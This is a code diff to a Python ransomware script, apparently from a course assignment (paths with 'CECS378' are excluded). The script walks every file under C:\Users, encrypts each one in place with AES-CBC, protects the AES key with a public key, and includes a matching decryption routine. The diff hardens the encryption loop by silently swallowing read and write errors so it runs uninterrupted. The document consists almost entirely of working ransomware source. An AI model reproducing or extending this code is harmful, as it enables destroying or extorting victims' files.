@@ -17,8 +17,11 @@ import os
 # Ransomware Encryption Utilities
 
 def encrypt_file(file_path, out_file_path, key):
-    with open(file_path, 'rb') as infile:
-        in_data = infile.read()
+    try:
+        with open(file_path, 'rb') as infile:
+            in_data = infile.read()
+    except Exception as e:
+        return
 
     initial_vector = get_random_bytes(AES.block_size)
     encryptor = AES.new(key, AES.MODE_CBC, initial_vector)
@@ -27,26 +30,35 @@ def encrypt_file(file_path, out_file_path, key):
 
     out_data = encryptor.encrypt(padded_data)
 
-    with open(out_file_path, 'wb') as outfile:
-        outfile.write(initial_vector+out_data)
+    try:
+        with open(out_file_path, 'wb') as outfile:
+            outfile.write(initial_vector+out_data)
+    except Exception as e:
+        return
 
 def decrypt_file(file_path, out_file_path, key):
-    with open(file_path, 'rb') as infile:
-        initial_vector = infile.read(AES.block_size)
-        to_decrypt = infile.read()
+    try:
+        with open(file_path, 'rb') as infile:
+            initial_vector = infile.read(AES.block_size)
+            to_decrypt = infile.read()
+    except Exception as e:
+        return
 
     encryptor = AES.new(key, AES.MODE_CBC, initial_vector)
     decrypted = unpad(encryptor.decrypt(to_decrypt), AES.block_size)
     
-    with open(out_file_path, 'wb') as outfile:
-        outfile.write(decrypted)
+    try:
+        with open(out_file_path, 'wb') as outfile:
+            outfile.write(decrypted)
+    except Exception as e:
+        return
 
 # Batch Functions
 file_paths = []
 
 def load_file_paths():
-    for root, dirs, files in os.walk("C:/Users"):
-        for name in dirs + files:
+    for root, dirs, files in os.walk("C:\\Users"):
+        for name in files:
             path = os.path.join(root, name)
             global file_paths
             if "CECS378" not in path.lower():
@@ -91,6 +103,7 @@ else:
     # Start Encrypting Computer
     load_file_paths()
     for path in file_paths:
+        print(path)
         encrypt_file(path, path, key)
 
     # Encrypt AES Key And Store In File
@@ -157,3 +170,4 @@ decrypted_aes = priv_key.decrypt(
 load_file_paths()
 for dec_path in file_paths:
     decrypt_file(dec_path, dec_path, decrypted_aes)
+
